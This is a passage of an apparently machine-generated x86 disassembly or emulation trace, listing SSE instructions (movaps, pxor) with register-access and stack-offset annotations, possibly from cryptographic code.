0x41c3f0: movaps xmm2, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [124] 0x41c3f7: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41c3fd: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c400: mov edi, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41c40b: movaps xmm3, xmm2, regs_read: [124], regs_write: [125] 0x41c415: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41c41d: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x41c424: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c437: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x41c43e: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c451: movaps xmmword ptr [ebp - 0x100], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x41c458: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c46b: movaps xmmword ptr [ebp - 0xf0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x41c472: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c485: movaps xmmword ptr [ebp - 0xe0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x41c48c: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c49f: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x41c4a6: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41c4b4: movaps xmmword ptr [ebp - 0x200], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x41c4c9: movaps xmmword ptr [ebp - 0x1b0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x41c4d0: pxor xmm3, xmmword ptr [edi], regs_read: [125, 23], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c4d4: mov edi, dword ptr [ebp - 0x15c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 0x41c4da: movaps xmm7, xmm3, regs_read: [125], regs_write: [129] 0x41c4dd: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x41c4e4: movaps xmm6, xmm3, regs_read: [125], regs_write: [128] 0x41c4f7: mov edi, dword ptr [ebp - 0x174], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7e8c for stack size 0x10000 0x41c502: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x41c505: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c50e: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c512: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c521: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c525: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c53a: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c53e: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c549: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c559: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41c55c: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c565: pxor xmm3, xmm5, regs_read: [125, 127], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c569: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41c585: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c589: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c58d: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c594: mov ecx, dword ptr [ebp - 0x134], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 0x41c59a: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41c5a6: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41c5a9: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41c5b2: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c5b6: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c5d2: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c5d9: mov ecx, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41c5df: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c5e3: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c5ec: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41c5ef: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41c5f8: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c5fc: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41c60b: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c612: mov ecx, dword ptr [ebp - 0x13c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ec4 for stack size 0x10000 0x41c618: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c62e: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c632: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c63b: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c63f: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41c648: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c64c: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41c662: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c669: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c672: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41c67b: pxor xmm5, xmm2, regs_read: [127, 124], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c67f: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c688: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c68c: movaps xmmword ptr [ebp - 0x260], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7da0 for stack size 0x10000 saving data to stack: 0 16 0x41c693: movaps xmmword ptr [ebp - 0x30], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 16 0x41c697: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c6a6: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c6ad: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c6b1: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41c6b4: pxor xmm5, xmmword ptr [ebp - 0x210], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x7df0 for stack size 0x10000 0x41c6bc: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41c6bf: pxor xmm4, xmmword ptr [ebp - 0x190], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41c6c7: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41c6ca: pxor xmm6, xmmword ptr [ebp - 0x220], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x7de0 for stack size 0x10000 0x41c6d2: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x41c6d5: pxor xmm7, xmmword ptr [ebp - 0x230], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x7dd0 for stack size 0x10000 0x41c6dd: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41c6e0: pxor xmm1, xmmword ptr [ebp - 0x1f0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7e10 for stack size 0x10000 0x41c6e8: movaps xmmword ptr [ebp - 0x1e0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x41c6ef: movaps xmm2, xmmword ptr [ebp - 0x20], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 0x41c6f3: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c6f7: movaps xmmword ptr [ebp - 0xa0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41c6fe: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41c705: movaps xmmword ptr [ebp - 0x90], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41c70c: movaps xmmword ptr [ebp - 0x80], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41c710: movaps xmmword ptr [ebp - 0x70], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41c714: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41c718: movaps xmm3, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 0x41c722: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c726: mov edi, 0xd, regs_read: (), regs_write: [23] 0x41c72b: movaps xmmword ptr [ebp - 0x50], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41c73b: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41c747: movaps xmmword ptr [ebp - 0xa0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41c753: movaps xmmword ptr [ebp - 0x90], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41c75f: movaps xmmword ptr [ebp - 0x80], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41c768: movaps xmmword ptr [ebp - 0x70], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41c771: movaps xmmword ptr [ebp - 0x60], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41c77a: movaps xmmword ptr [ebp - 0x50], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41c787: mov eax, dword ptr [ebp - 0x164], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e9c for stack size 0x10000 0x41c78d: mov edi, 7, regs_read: (), regs_write: [23] 0x41c792: movaps xmmword ptr [ebp - 0x1b0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x41c7a5: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c7a9: mov ecx, dword ptr [ebp - 0x154], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7eac for stack size 0x10000 0x41c7b2: mov eax, dword ptr [ebp - 0x140], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ec0 for stack size 0x10000 0x41c7bd: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c7c1: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x41c7c8: movaps xmm2, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 0x41c7d2: mov eax, dword ptr [ebp - 0x144], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ebc for stack size 0x10000 0x41c7dd: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c7e1: movaps xmmword ptr [ebp - 0xa0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x41c7f0: mov eax, dword ptr [ebp - 0x148], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb8 for stack size 0x10000 0x41c7fb: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c7ff: movaps xmmword ptr [ebp - 0x90], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x41c80e: mov eax, dword ptr [ebp - 0x14c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb4 for stack size 0x10000 0x41c819: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c81d: movaps xmmword ptr [ebp - 0x80], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 16 0x41c821: movaps xmmword ptr [ebp - 0x70], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 16 0x41c828: mov eax, dword ptr [ebp - 0x150], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7eb0 for stack size 0x10000 0x41c82e: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c832: movaps xmmword ptr [ebp - 0x60], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 16 0x41c83f: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c843: movaps xmmword ptr [ebp - 0x50], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41c863: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41c86a: movaps xmm1, xmmword ptr [ebp - 0x200], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 0x41c871: movaps xmm2, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [124] 0x41c878: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c880: mov edi, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41c886: mov eax, dword ptr [ebp - 0x168], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 0x41c890: mov ecx, dword ptr [ebp - 0x134], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 0x41c896: movaps xmmword ptr [ebp - 0x200], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x41c8a0: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x41c8aa: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c8ce: movaps xmmword ptr [ebp - 0x1b0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x41c8d5: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x41c8dc: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x41c8ea: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41c907: mov dword ptr [ebp - 0x168], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 saving data to stack: 0 4 0x41c90d: movaps xmmword ptr [ebp - 0x1f0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x41c914: movaps xmmword ptr [ebp - 0x100], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x41c91b: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41c922: mov dword ptr [ebp - 0x134], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x41c928: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c930: movaps xmmword ptr [ebp - 0x230], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7dd0 for stack size 0x10000 saving data to stack: 0 16 0x41c937: movaps xmmword ptr [ebp - 0xf0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x41c93e: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x41c945: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x41c94d: movaps xmmword ptr [ebp - 0x220], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x41c954: movaps xmmword ptr [ebp - 0xe0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x41c95b: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41c962: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41c96a: movaps xmmword ptr [ebp - 0x210], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x41c971: movaps xmmword ptr [ebp - 0xd0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x41c978: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x41c98a: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41c99c: movaps xmmword ptr [ebp - 0x20], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41c9a0: movaps xmmword ptr [ebp - 0xc0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x41c9a7: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41c9aa: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41c9ad: movaps xmmword ptr [ebp - 0x190], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41c9b4: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41c9c3: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41c9cf: pxor xmm6, xmmword ptr [ebp - 0x1e0], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 0x41c9e2: pxor xmm3, xmmword ptr [ebp - 0x260], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x7da0 for stack size 0x10000 0x41c9ea: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41c9fa: pxor xmm4, xmmword ptr [ebp - 0x30], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x7fd0 for stack size 0x10000 0x41ca05: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca09: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41ca12: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41ca15: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca2c: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca38: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca41: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41ca44: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x41ca4d: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca51: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41ca60: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca67: mov eax, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41ca7a: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca83: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca87: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41ca8a: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41ca93: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41ca97: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41caa6: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41caad: mov ecx, dword ptr [ebp - 0x13c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ec4 for stack size 0x10000 0x41cac0: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cac9: pxor xmm5, xmm6, regs_read: [127, 128], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cacd: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41cad6: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cada: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x41caef: pxor xmm3, xmm4, regs_read: [125, 126], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41caf3: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41cb09: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb10: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb19: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x41cb1c: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x41cb25: pxor xmm7, xmm2, regs_read: [129, 124], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb29: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41cb38: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb3c: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x41cb45: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb49: pxor xmm2, xmm4, regs_read: [124, 126], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb54: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x41cb63: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb67: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x41cb6a: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb74: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41cb77: pxor xmm1, xmm5, regs_read: [123, 127], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb80: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41cb84: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41cb91: mov eax, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41cb97: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41cb9c: movaps xmm5, xmmword ptr [ebp - 0x230], regs_read: [20], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x7dd0 for stack size 0x10000 0x41cba3: mov edi, dword ptr [ebp - 0x154], regs_read: [20], regs_write: [23] adjusting stack 